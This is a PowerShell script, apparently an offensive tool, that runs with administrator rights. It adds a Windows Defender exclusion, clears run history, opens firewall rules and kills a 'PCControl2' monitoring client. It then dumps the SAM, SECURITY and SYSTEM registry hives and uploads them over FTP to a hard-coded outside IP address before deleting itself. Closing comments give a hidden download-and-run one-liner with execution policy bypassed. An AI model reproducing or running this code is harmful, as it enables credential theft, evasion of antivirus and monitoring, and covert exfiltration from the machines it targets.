echo "Running";

$hostname = (hostname); # get hostname

function Test-IsAdmin {
     ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 }

if(Test-IsAdmin) # Check privileges
{
    echo "Creating environment";
    rm -r -fo "C:\Users\Public\Microsoft" -erroraction 'silentlycontinue';
    Remove-Item HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -erroraction 'silentlycontinue';

    md "C:\Users\Public\Microsoft" >$null;
    #md "C:\Program Files\Common Files\Microsoft" -erroraction 'silentlycontinue' >$null;
    icacls "C:\Users\Public\Microsoft" /q /c /t /grant Users:F >$null;
    #icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F >$null;
    Add-MpPreference -ExclusionPath 'C:\Users\Public\Microsoft' >$null;
    #Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft' >$null;
    
    echo "Setting up Firewall";
    New-NetFirewallRule -DisplayName "FTP-in"  -Direction Inbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
    New-NetFirewallRule -DisplayName "FTP-out"  -Direction Outbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
}
else
{
    echo "NOT ENOUGH PRIVILEGES";
    Exit;
}

function destruct() # 0 - Exit and self-destruct
{
    rm -r -fo "C:\Users\Public\Microsoft";
    rm -fo ".\run.ps1";
    Exit;
}

function exportHashes() # 1 - Export hashes
{
    #----------------------------------------------SAVE HASHES-----------------------------------------------

    md "C:\Users\Public\Microsoft\$hostname";
    reg.exe save hklm\sam "C:\Users\Public\Microsoft\$hostname\sam.save";
    reg.exe save hklm\security "C:\Users\Public\Microsoft\$hostname\security.save";
    reg.exe save hklm\system "C:\Users\Public\Microsoft\$hostname\system.save";

    #----------------------------------------------CREATE FOLDER-----------------------------------------------

    $ftpdir = [System.Net.FtpWebRequest]::Create("ftp://hashes:123passnext321@5.182.17.134//PCs/$hostname");
    $ftpdir.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
    $ftpdir.UseBinary = $true

    $response = $ftpdir.GetResponse() >$null;
    echo $response.StatusDescription;
    $response.Close() >$null;

    #----------------------------------------------UPLOAD HASHES-----------------------------------------------

    $source = "C:\Users\Public\Microsoft\$hostname";

    $files = Get-ChildItem $source;

    foreach ($file in $files) {
        $request = [Net.WebRequest]::Create("ftp://hashes:123passnext321@5.182.17.134//PCs/$hostname/$file")
        $request.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile

        $fileStream = [System.IO.File]::OpenRead("$source/$file")
        $ftpStream = $request.GetRequestStream()

        $buffer = New-Object Byte[] 10240
        while (($read = $fileStream.Read($buffer, 0, $buffer.Length)) -gt 0)
        {
            $ftpStream.Write($buffer, 0, $read)
            $pct = ($fileStream.Position / $fileStream.Length)
            Write-Progress -Activity "Uploading $file" -Status ("{0:P0} complete:" -f $pct) -PercentComplete ($pct * 100)
        }

        $ftpStream.Dispose()
        $fileStream.Dispose()
    }
    $webclient.Dispose();
    
    destruct;
}

function pcControl() # 4 - PC(not in)Control
{
    sc.exe failure PCControl2ClientService actions=""/1000/""/1000/""/1000 reset=86400;

    taskkill /F /IM PCControl2ClientService.exe /T;
    taskkill /F /IM PCControl2ClientUser.exe /T;
    taskkill /F /IM PCControl2Client.exe /T;
    
    exportHashes;
}

pcControl;

#powershell -ExecutionPolicy Bypass -File .\autorun.ps1
#powershell -Sta -Nop -Window Hidden wget https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/autorun.ps1 -outfile run.ps1; powershell -Sta -Nop -Window Hidden -ExecutionPolicy Bypass -File .\run.ps1
